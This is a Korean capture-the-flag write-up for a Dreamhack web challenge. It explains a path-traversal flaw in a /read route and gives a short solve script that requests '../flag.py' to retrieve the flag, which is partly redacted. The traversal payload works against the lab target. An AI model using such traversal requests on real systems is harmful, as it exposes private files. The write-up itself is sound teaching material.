# Category

web

# Overview

File Download 취약점이 존재하는 웹 서비스입니다.
flag.py를 다운로드 받으면 플래그를 획득할 수 있습니다.

# Analysis

파일 업로드가 완료된 파일들을 읽어오는 `/read` 라우트의 경우 `name` 파라미터를 통해 파일을 불러올 수 있으며, 클라이언트 요청에 대한 파라미터를 검사와 같은 요청에 대한 제약이 없는 것을 알 수 있다.

파일이 저장되는 경로인 `/uploads/{filename}`에서 파일을 가져오고 있어, flag가 저장되어있는 위치인 `uploads`의 상위 폴더로 이동해 파일을 가져올 수 있다.

# Exploitation

`name의` 파라미터를 `../flag.py`로 지정하게 되면, 서버는 `uploads/../flag.py`를 가져오게 되며, `uploads`의 상위 폴더에 있는 `flag.py`를 읽어 flag를 획득할 수 있다.

```py
# solve.py

res = req(
  url="http://host8.dreamhack.games:20905/read?name=../flag.py",
  method= "GET",
)

matched = re.search("DH{.*}", res.text)

print(matched.group() if matched else "NO FLAG")
```

# Flag

`DH{up...am}`
